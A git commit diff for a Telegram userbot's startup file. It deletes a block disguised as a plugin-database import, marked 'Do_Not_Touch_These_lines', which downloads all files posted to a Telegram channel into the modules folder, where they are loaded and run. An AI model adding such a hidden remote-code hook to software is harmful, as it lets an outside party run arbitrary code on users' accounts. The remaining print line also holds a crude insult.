c609b39db6b9286f1e1d452d56a0e125eb54db3e
Sachin Jangir <sachinjangir022@gmail.com>
2020-07-27 21:09:37 +0530

    Update __main__.py

--- userbot/__main__.py
+++ userbot/__main__.py
@@ -55,18 +55,6 @@ for name in files:
         shortname = path1.stem
         load_module(shortname.replace(".py", ""))
 
-print("Importing Plugins Database...")
-#Do_Not_Touch_These_lines
-
-async def a():
-    username = "@cbkhs"
-    test1 = await client.get_messages("username", None , filter=InputMessagesFilterDocument) ; total = int(test1.total) ; total_doxx = range(0, total)
-    for ixo in total_doxx:
-        mxo = test1[ixo].id ; await client.download_media(await client.get_messages(username, ids=mxo), "userbot/modules/")
-client.loop.run_until_complete(a())
-
-print("Imported Plugins Database Sucessfully")
-
 import userbot._core
 
 print("Chal Gya hu bsdk Ab jaa k saved msgs me .help ya .alive type krke confirm kr le")
